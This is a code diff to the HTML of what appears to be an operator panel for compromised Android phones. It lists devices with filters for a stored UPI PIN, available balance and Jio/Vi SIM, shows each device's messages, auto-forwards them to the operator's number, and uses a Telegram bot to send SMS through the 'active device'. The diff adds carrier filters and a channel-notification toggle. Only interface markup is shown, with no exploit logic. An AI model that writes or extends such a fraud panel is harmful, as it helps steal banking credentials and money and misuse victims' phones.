@@ -72,6 +72,8 @@
         <div onclick="setGridFilter('all')" data-f="all">🌐 All Devices</div>
         <div onclick="setGridFilter('online')" data-f="online">🟢 Online Only</div>
         <div onclick="setGridFilter('offline')" data-f="offline">🔴 Offline Only</div>
+        <div onclick="setGridFilter('jio')" data-f="jio">📡 Jio SIM</div>
+        <div onclick="setGridFilter('vi')" data-f="vi">📡 Vi SIM</div>
         <div onclick="setGridFilter('pin')" data-f="pin">💳 Has UPI PIN</div>
         <div onclick="setGridFilter('balance')" data-f="balance">💰 Has Balance</div>
       </div>
@@ -99,7 +101,7 @@
         <div class="dm-icon">📱</div>
         <div>
           <div class="dm-name" id="dmName">Device</div>
-          <div class="dm-sub" id="dmSub">—</div>
+          <div class="dm-sub" id="dmSub" onclick="copyDeviceId()" title="Tap to copy full ID" style="cursor:pointer;user-select:none">—</div>
         </div>
       </div>
       <div class="dm-header-right">
@@ -108,7 +110,6 @@
     </div>
 
     <div class="dm-body">
-      <!-- LEFT COLUMN -->
       <div class="dm-left">
         <div class="dm-hero" id="dmHero"></div>
         <div class="dm-bal-hero" id="dmBalHero"></div>
@@ -148,7 +149,6 @@
         </div>
       </div>
 
-      <!-- RIGHT COLUMN -->
       <div class="dm-right">
         <div class="dm-tabs">
           <button class="dm-tab active" data-tab="msgs" onclick="dmSwitchTab('msgs')">💬 Messages</button>
@@ -273,26 +273,34 @@
         <input class="fi" id="setMyNumber" placeholder="+91 9876543210"/>
       </div>
 
-      <div class="settings-section">
-        <div class="settings-title">🤖 Telegram Bot</div>
-        <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your Telegram channel as admin. Every message containing a number will trigger an SMS via the active device.</div>
 
-        <label class="fl">Your Telegram User ID (owner)</label>
-        <input class="fi" id="setTgUserId" placeholder="e.g. 123456789"/>
 
-        <label class="fl">Channel ID</label>
-        <input class="fi" id="setTgChannel" placeholder="-1001234567890 or @channelname"/>
 
-        <div class="settings-toggle-row">
-          <input type="checkbox" id="setTgEnabled"/>
-          <label for="setTgEnabled">Enable Telegram Bot</label>
-        </div>
-        <div class="settings-toggle-row">
-          <input type="checkbox" id="setFwdEnabled"/>
-          <label for="setFwdEnabled">Auto-forward device messages to My Number</label>
-        </div>
-        <div class="settings-status" id="tgStatusLine">Not running</div>
-      </div>
+
+
+
+
+<div class="settings-section">
+  <div class="settings-title">🤖 Telegram Bot</div>
+  <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your Telegram channel as admin. Every message containing a number will trigger an SMS via the active device.</div>
+
+  <label class="fl">Channel ID</label>
+  <input class="fi" id="setTgChannel" placeholder="-1001234567890 or @channelname"/>
+
+  <div class="settings-toggle-row">
+    <input type="checkbox" id="setTgEnabled"/>
+    <label for="setTgEnabled">Enable Telegram Bot</label>
+  </div>
+  <div class="settings-toggle-row">
+    <input type="checkbox" id="setFwdEnabled"/>
+    <label for="setFwdEnabled">Auto-forward device messages to My Number</label>
+  </div>
+  <div class="settings-toggle-row">
+    <input type="checkbox" id="setChannelNotify"/>
+    <label for="setChannelNotify">📢 Post confirmation in channel on every SMS sent</label>
+  </div>
+  <div class="settings-status" id="tgStatusLine">Not running</div>
+</div>
 
       <div class="settings-section">
         <div class="settings-title">📤 Forward Mode</div>
@@ -304,7 +312,6 @@
         <div style="font-size:11px;color:var(--dim);line-height:1.5;margin-top:10px" id="fwdModeHint">All incoming messages will be forwarded</div>
       </div>
 
-      <!-- ══════════ CUSTOM START/END PARSER ══════════ -->
       <div class="settings-section">
         <div class="settings-title">📱 Telegram Message Format (Start/End)</div>
         <div class="settings-desc">Jo text "Start" aur "End" ke beech aayega wahi extract hoga. <b style="color:var(--mint)">End blank</b> chhodo to "last tak" lega.</div>
@@ -333,7 +340,6 @@
         </div>
       </div>
 
-      <!-- ══════════ ADVANCED FALLBACK LABELS ══════════ -->
       <div class="settings-section">
         <div class="settings-title">🔧 Fallback Labels (Optional)</div>
         <div class="settings-desc">Agar start/end set nahi hai to in labels se detect hoga.</div>
